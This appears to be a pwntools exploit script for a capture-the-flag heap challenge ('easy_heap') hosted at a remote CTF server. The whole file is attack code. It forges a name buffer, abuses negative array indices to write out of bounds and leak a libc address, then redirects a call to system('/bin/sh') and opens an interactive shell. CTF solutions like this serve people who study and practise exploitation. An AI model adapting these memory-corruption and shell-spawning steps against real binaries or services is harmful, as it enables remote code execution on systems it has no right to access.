from pwn import *

HOST, PORT = "easyheap.acebear.site", "3002"
# HOST, PORT = "0.0.0.0", 31337
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("choice: ")
ii = lambda x: r.sendline(str(x))

c0 = lambda: r.recvuntil(': ')

r.recvuntil('name: ')
buf = 0x804b0e0
main = 0x080489f6
name = p32(0x804b030) + p32(7) + p32(buf + 32 - 6) + p32(buf + 20) + p32(buf - 0x48) + p32(main) * 3
r.send(name.ljust(0x20))
c0()
r.send('%16d' % u32('\x00\xff--'))
def add(index, value):
    menu()
    ii(1)
    c0()
    ii(index)
    c0()
    r.send(value)
def show(index):
    menu()
    ii(4)
    c0()
    ii(-7)
    r.recvuntil(' is: ')
    return r.recvuntil('\n', drop=True)
add(-39, '\x00' * 32)
add(0, 'b' * 12 + p32(buf + 8 - 4) + p32(buf + 12 - 4))
add(0, 'a' * 32)
add(0, 'a' * 4 + p32(buf + 16 - 4))
add(1, '/bin/sh')
data = show(-7)
print hexdump(data)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('/=/Downloads2/easy_heap/easyheap_libc.so.6')
libc.address = u32(data[4:8]) - libc.symbols['_IO_2_1_stdout_'] & ~0xfff
print hex(libc.address)
menu()
pause()
ii(5)
r.recvuntil('name: ')
system = libc.symbols['system']
name = name[:-16] + p32(buf - 0x18) + p32(system) * 3
r.send(name.ljust(0x20))
r.send('%16d' % u32('\x00\xff--'))
menu()
ii(3)
c0()
ii(1)
r.interactive()
